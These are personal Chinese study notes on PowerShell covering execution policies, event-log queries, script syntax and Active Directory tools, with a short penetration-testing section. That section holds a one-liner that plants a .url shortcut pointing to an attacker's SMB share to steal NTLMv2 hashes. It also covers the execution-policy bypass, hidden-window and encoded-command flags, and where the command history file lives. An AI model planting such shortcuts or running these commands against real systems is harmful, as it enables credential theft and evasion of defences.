---
tags:
  - IT/Windows
  - 渗透
---
## 执行策略

**仅对脚本。命令不受此限制。**

- Restricted：默认，**不能运行脚本**
- RemoteSigned：**本地创建的脚本可以运行**；对于网上下载的脚本，如果有受信任发布者的数字签名则可运行
- AllSigned：如果脚本有受信任发布者的数字签名则可运行
- Unrestricted：**不受限制**（即不管来自哪里、不管是否有签名）

**相关命令：**

- 查看当前策略：`Get-ExecutionPolicy`
- 修改策略：`Set-ExecutionPolicy <policy-name>`。需要管理员权限（一般没必要用这个，直接看下面的命令↓）
- 绕过：`powershell (-ep bypass | -exec bypass)`


## 参数选项flag

- 可以用短横杠(-)
- 也可以用斜杠(/)，实际上是cmd命令的参数


## powershell的接头词

![[Pasted image 20240309114634.png]]


## where对象与select对象

![[Pasted image 20240309114705.png]]

### 简写

- `Where-Object`的简写：`?`。如用：`| ?`
- `Select-Object`的简写：`select`。如用：`| select`

## 实用命令

### 环境变量

查看：

- `gci $env:*`
- `ls env:`
- `$env:userprofile`

> [[cmd#环境变量]]



> [hacktricks: Basic PowerShell for Pentesters](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters)

### 基础

```powershell
## --help
Get-Help *                      #List everything loaded
Get-Help process                #List everything containing "process"
Get-Help Get-ChildItem -Parameter *
Get-Help Get-Item -Full         #Get full helpabout a topic
Get-Help Get-Item -Examples     #List examples

## cat
Get-Content
## ls
Get-ChildItem
## find
Get-ChildItem -r -Filter "*.txt"    
	-File
	-Directory

Get-Process | Get-Member
Get-Process | Select-Object -Property ProcessName, ID, StartTime

Get-Alias iex


# 确认详细信息
... | Format-List
## 缩写
... | fl
```

### 查看[[ACL]]

`Get-Acl <directory_path> | fl`


### 文本处理

```powershell
gc log.txt -head 10
gc log.txt | select -first 10    ## head
gc -TotalCount 10 log.txt        ## also head
gc log.txt | select -last 10     ## tail
gc -tail 10 log.txt              ## also tail (since PSv3), also much faster than above option
gc log.txt -tail 10 -wait        ## equivalent to tail -f
gc log.txt | more                ## or less if you have it installed


gc log.txt | %{ $_ -replace '\d+', '($0)' }    ## sed
```

![[Pasted image 20240309130545.png]]



### 渗透

#### 上传

[[FileTransfers-Windows#Upload]]

#### 下载

[[FileTransfers-Windows#Download]]

#### 历史命令

- 查看保存历史命令的文件：`(Get-PSReadlineOption).HistorySavePath`
- 查看历史命令：`Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt`



#### NTLMv2窃取

scf文件

web快捷方式
```powershell
$url = "file://10.10.14.46/share/test.hta"; $shortcutPath = "C:\inetpub\testing\test.url"; $shortcutContent = "[InternetShortcut]`r`nURL=$url"; Set-Content -Path $shortcutPath -Value $shortcutContent
```

- `file://`的话似乎需要开启SMB服务。



### 事件调查时

> 《详解 事件响应》P96




## 重要参数

- `-NoProfile`（`-NoP`）：不加载当前用户的配置。
- `-NonInteractive`（`-NonI`）：它显示窗口，只是禁用交互。
- `-w Hidden`：`WindowStyle='Hidden'`
- `-c`：`-Command`
	- 关于**单引号内**不能用双引号而要用两个单引号——[在单引号内要输出一个单引号就要用两个单引号——相当于单引号用来转义](https://www.zhiu.cn/60919.html)。下图例：  
	![[Pasted image 20240309124417.png]]
- `-noexit`：执行后不退出。对于如键盘记录等脚本来说很重要，因此这些脚本得以持续执行
- `-enc`（`-e`）：执行编码字符。（相对于-c则是执行单纯字符）
	- 其base64编码仅支持UTF-16LE（“Unicode”）字符串，不支持utf-8。【因为通常powershell的默认编码是Unicode UTF-16LE】
	- 转base64（UTF-16LE）：
		- 在Windows转base64（UTF-16LE）的命令：`[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('<your command>'))`
		- 用LINUX命令（iconv）：[[Linux命令#^f44db6|echo -en "[Command]" | iconv -t UTF-16LE | base64 -w 0]]
		- 用CyberChef：  
			![[Pasted image 20240309124158.png]]

> [https://redcanary.com/blog/investigating-powershell-attacks/](https://redcanary.com/blog/investigating-powershell-attacks/)





## Eventlog相关

log PATH: `C:\Windows\System32\winevt\Logs\`

用户可以通过三种主要方式从 Windows 会话访问事件日志。它们是：

- 图形 Windows 事件查看器`eventvwr.msc`
- 命令行`wevtutil.exe`
- PowerShell cmdlet: `Get-WinEvent`

### Get-Eventlog

> [【 Get-EventLog 】コマンドレット――Windowsのイベントログを取得する](https://atmarkit.itmedia.co.jp/ait/spv/1608/23/news023.html)  
> [Get-Eventlogの使い方から覚えていくPowershellの基本的な使い方](https://qiita.com/Anubis_369/items/d0566143a1356a2f8ec5)

> [!NOTE] 将被 [[powershell#Get-WinEvent|Get-WinEvent]] 替代  
> Application or Service log的话推荐用`Get-WinEvent`。

- `Get-EventLog "Windows PowerShell" -InstanceID 400 -After "2022/12/21" -Before "2022/12/22" | Export-Csv -Encoding Default $env:HOMEPATH"\Downloads\powershellLog.csv"`

- `Get-EventLog -List`
- `Get-EventLog [-LogName] <イベントログ名>`

- 从Application的log指定等级或ID：`Get-EventLog Application | Where-Object {$_.EntryType -eq "Warning"}`

- `Get-EventLog Application | Format-List`
	- 本来只是显示简要信息，用“Format-List”的话显示详细

- `Get-EventLog Application | Select-Object TimeGenerated,Index,EntryType,InstanceID,Message`
	- 指定field（全field看详细），按照指定排序输出

- `Get-EventLog Application | Export-CSV -Encoding Default C:\Work\Applog.csv`
	- 输出CSV，注意用`-Encoding Default`，或UFT8，否则中日语可能乱码

#### 指定时间范围

时间格式：`YYYY/MM/DD`

- `-Before`
- `-After`

另：用`-Newest [num]`获取最新指定条数。

### Get-WinEvent

![[Pasted image 20240309115312.png]]

> [https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/get-winevent?view=powershell-7.3#example-9-get-event-ids-that-the-event-provider-generates](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/get-winevent?view=powershell-7.3#example-9-get-event-ids-that-the-event-provider-generates)

```powershell
Get-WinEvent -ListLog *

Get-WinEvent -ListProvider *：The Name is the provider, and LogLinks is the log that is written to.

Get-WinEvent -LogName Application | Where-Object { $_.ProviderName -Match 'WLMS' }
```

**`Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104} | Select-Object -Property Message | Select-String -Pattern 'SecureString'`**
> [!NOTE] 我们可以通过运行以下命令获得与上面相同的结果  
> 根据 Microsoft 的说法，在处理大型事件日志时，将对象沿着管道发送到 Where-Object 命令的效率很低。建议使用 Get-WinEvent cmdlet 的 FilterHashtable 参数来筛选事件日志。

```powershell
Get-WinEvent -FilterHashtable @{
  LogName='Application' 
  ProviderName='WLMS' 
}
```

- 各参数不分行的话可以用分号分隔：`@{ <name> = <value>; <name> = <value>  ...}`  
	![[Pasted image 20240309120419.png]]

- 即下图“Windows 事件查看器”的这些：  
	![[Pasted image 20240309120522.png]]





## 括号

### 小括号

- `&()`：似乎和linux一样——子表达式，所以在子进程里执行。（可理解为后台执行？）
	> [[powershell#`&`调用运算符]]


### 花括号

可用于声明在变量中间或内部带有空格的变量。等：

> What might not be obvious on a first glance is that you can use any [provider](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_providers?view=powershell-6) within `${}`, for example: `${c:\tmp\foo.txt}="Hello World"`  
> The effect depends on the provider. For the file system provider the example changes the content of the specified file.

**也表示脚本块，在当前进程中执行。**

### .NET的调用（关于中括号和两个冒号）

![[Pasted image 20240309130014.png]]

例子：  
![[Pasted image 20240309130105.png]]
> https://learn.microsoft.com/en-us/dotnet/api/system.io.file.copy?redirectedfrom=MSDN&view=net-7.0#System_IO_File_Copy_System_String_System_String_System_Boolean_




## 特殊符号

### dot source

`. .\脚本名`

通常，`.\脚本名`执行后，脚本内的变量等将被废弃。  
但是，用`. .\脚本名`执行后，脚本内的变量等还会存在。（大概是Linux里子进程继承环境变量的意思）

### `&`调用运算符

运行储存在变量中由字符串/脚本块表示的命令（注意：所以该命令不解析字符串/参数）
> [call-operator](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_operators?view=powershell-5.1#call-operator-)

例子：  
`powershell -exec bypass -Command "& {import-module test.ps1}"`

- 如果没有`&`运算符，则仅仅输出大括号内的内容（"import-module test.ps1"，由于用大括号表示了变量）
- 如果连大括号都没有，则把双引号内的内容整体当命令。（那所以为什么要用&{}来执行？）

### `%` (`ForEach-Object`)

`[byte[]]$bytes = 0..65535|%{0};`

生成一个长度为65536的字节数组，每个字节都初始化为0。


## [[System32与SysWOW64#判断应用程序的位数]]


## PS1脚本语法

### 变量

`$<variable> = <value>`。直接赋值，直接"$"调用。

### 字符串拼接

```powershell
$name = "John"
# 双引号中直接插入（但是有时候不行，比如变量后面跟着冒号的时候？）
Write-Host "Hello, $name!"    # Write-Host: print

# 子表达式拼接
Write-Host "Hello, $($name)!"
```

### 数组

创建方式（有多种）：

- `$id = 1,2,3,4`
- `$id = (1,2,3,4)`
- `$id = @(1,2,3,4)`

- 使用`@`显示声明数组。好处：在创建单元素数组时，如果使用`(1)`则表示单个数值 1。没有 `@()`时PowerShell 不会把单个值视为数组。

访问：

- `$id[0,3]`：查询第1~4个
- `$id.count`：统计个数


### 字典

创建：用`@{}`。

访问：和python一样。


### 循环

```powershell
$folderPath = "C:\tmp"; $fileList = Get-ChildItem -Path $folderPath | ForEach-Object { Join-Path $folderPath $_.Name };
foreach ($file in $fileList) { Get-WinEvent -Path $file | Where-Object {$_.Message -like "*USERID*"} }
```







## Get-ADUser

默认仅安装在域控，是AD管理工具RSAT(Remote Server Administration Tools)的一部分。Win7以上的工作站能安装，不过需要管理员权限。

- [https://technet.microsoft.com/en-us/library/gg413289.aspx](https://technet.microsoft.com/en-us/library/gg413289.aspx)

### 确认安装

`Get-WindowsCapability -Online -Name "Rsat*" | select Name,State`

> 在PowerShell中，指定 `-Online` 的原因是因为 `Get-WindowsCapability` 命令不仅可以操作当前运行的系统，还可以操作离线的Windows映像（比如WIM文件）或虚拟硬盘文件（VHD/VHDX）。通过指定 `-Online`，明确表示命令是针对当前正在运行的操作系统实例，而不是离线映像。

### 安装服务

#### 直接GUI

因为之前用的powershell方法莫名报错了：找到“Optional features”（设置里的system或者app）

> 注意：从 Windows 10 October 2018 Update 开始，不再需要下载 RSAT 工具。它们现在包含在 Windows 版本中，只需安装即可。 RSAT 工具仅在 Windows 10 和 11 的 Windows 专业版和企业版上受支持。

#### 自己查的方法

看了下会安装 `DS-LDS` 和 `ServerManager`。

- `Get-WindowsCapability -Online -Name RSAT.ActiveDirectory* | Add-WindowsCapability -Online`

#### 公司文档（只安装DS-LDS和GPO管理）

- `Add-WindowsCapability -Online -Name "Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0"`
- `Add-WindowsCapability -Online -Name "Rsat.GroupPolicy.Management.Tools~~~~0.0.1.0"`

### 公司内用

不能走WSUS/proxy！否则就算用网上的方法也不行。

`Get-ADUser -Filter 'UserPrincipalName -like "name@doman.com"' -SearchBase "DC=domain,DC=com" -Properties *`



## 各种链接

[Intro to PowerShell Scripting for Security](https://www.irongeek.com/i.php?page=videos/hack3rcon5/h01-intro-to-powershell-scripting-for-security)